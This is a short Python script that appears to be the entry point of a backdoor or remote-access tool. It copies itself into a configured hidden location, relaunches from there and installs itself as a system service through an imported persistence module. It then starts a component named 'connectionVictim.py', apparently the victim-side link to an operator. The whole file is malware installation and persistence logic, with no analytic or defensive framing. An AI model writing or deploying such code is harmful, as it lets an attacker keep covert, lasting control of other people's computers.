#!/usr/bin/python3
import config
import os
import tarfile
import persistence
import subprocess

#true if run as root
isRoot = os.popen("echo $USER").read()=="root\n"

#set cwd correctly to directory this file is in
os.chdir(os.path.split(os.path.abspath(__file__))[0])

#check if persistence is setup
userData = config.root if isRoot else config.user
tarExists = os.path.exists(config.tarName)
correctDir = os.path.abspath(".")+"/"==os.path.expanduser(userData["targetDir"])
serviceFound = os.path.exists(os.path.expanduser(userData["serviceLoc"])+config.serviceName)

#setup missing things
if not tarExists:
	persistence.compress(config.tarName)

if not correctDir:
	persistence.move(config.tarName)
	# run python file in new location
	subprocess.Popen(["python3", os.path.expanduser(userData["targetDir"]) + "main.py"])
	exit()

if not serviceFound:
	persistence.createService(userData["targetDir"] + "main.py")



subprocess.Popen(["python3", os.path.expanduser(userData["targetDir"]) + "connectionVictim.py"])
